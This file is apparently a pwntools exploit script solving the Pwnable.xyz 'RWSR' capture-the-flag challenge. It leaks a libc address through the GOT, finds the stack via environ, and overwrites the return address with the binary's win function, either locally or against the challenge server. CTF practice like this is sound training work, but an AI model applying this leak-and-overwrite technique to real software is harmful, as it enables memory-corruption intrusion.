
from pwn import *

# Pwnable.xyz RWSR challenge
# 100 points

"""
Read Write Sleep Repeat.
Menu:
  1. Read
  2. Write
  0. Exit
> 
"""

def get_value(p, addr):
	p.sendlineafter(b"> ", b"1")
	p.sendlineafter(b": ", hex(addr).encode("utf-8"))
	return p.recvuntil(b"\nMenu:")[:-6]

def get_qword(p, addr):
	temp_value = get_value(p, addr)
	temp_value += b"\x00"
	while len(temp_value) < 8:
		temp_value += get_value(p, addr+len(temp_value))
		temp_value += b"\x00"

	print("[ ] Temp value is: ", temp_value)
	return unpack(temp_value[:8])

def set_value(p, addr, value):
	p.sendlineafter(b"> ", b"2")
	p.sendlineafter(b": ", hex(addr).encode("utf-8"))
	p.sendlineafter(b": ", hex(value).encode("utf-8"))

context(kernel="amd64", arch="amd64", log_level="debug")

def main():
	e = ELF("./challenge/challenge")
	if 1:
		p = process("./challenge/challenge")
		gdb.attach(p)
		lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")
	elif 0:
		p = process(["strace", "-o", "strace.out", "./challenge"])
	else:
		lib = ELF("./libc/alpine-libc-2.28.so")
		p = remote("svc.pwnable.xyz", 30019)

	printf_addr = get_qword(p, e.got["puts"])
	print("[+] Leaked printf address: 0x%x" % printf_addr)
	libc_base = printf_addr - lib.symbols["puts"]
	environ_addr = libc_base + lib.symbols["environ"]

	environ_rbp_offset = 0x108

	environ_stack = get_qword(p, environ_addr)
	print("[+] Environ address in stack: 0x%x" % environ_stack)
	ret_addr = environ_stack - environ_rbp_offset + 0x8

	set_value(p, ret_addr, e.symbols["win"])
	# set_value(p, ret_addr-0x8, e.symbols["win"])
	p.sendlineafter(b"> ", b"0")
	print("[+] Get result: ")
	print(p.recvrepeat())




main()